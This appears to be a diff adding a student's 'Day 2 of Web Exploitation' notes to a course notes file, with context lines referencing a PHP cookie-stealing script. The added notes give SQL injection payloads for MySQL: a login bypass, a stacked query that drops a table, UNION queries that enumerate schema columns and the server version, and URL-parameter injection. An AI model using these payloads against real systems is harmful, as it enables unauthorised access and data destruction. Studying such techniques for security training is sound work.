@@ -86,6 +86,25 @@ Cookie Stealing (This will break the website): <?php
                                                ?>
                                                Malicious Injection script is in the spaghetti, just change the ip and port
 
+----------
+Day 2 of Web Exploitation
+We use MySQL -- Any googling needs to look only at this version of SQL
+Demo: cmd to remember --> select * from messages.comments;
+      To pad columns in UNION --> select tireid,name,size,cost,5,6 FROM session.Tires UNION SELECT * from session.car;
+      To Help: https://sqlbolt.com/
+Injection Example: SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’  ##The tom' OR 1='1 is what we put in -- the quotes enable us to inject code ###This is all we can do in a login field
+                   SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; #’  ##Chaining statements together with ";" -- "; #" is at the end to end the query safely
+                   UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'  ##Golden Statment -- We will always pull from information_schema.columns ##Always end the statement with ";#"
+                   
+                   Normal Query to pull expected output: php?item=4
+                   Blind injection for validation: php?item=4 OR 1=1  ##No quotes because the input is an integer
+
+                   Passing injection thru url: prices.php?item=4 UNION SELECT 1,2
+                                               prices.php?item=4 UNION SELECT 1,2,@@version  ##For Version
+
+                   
+
+
 
 
 
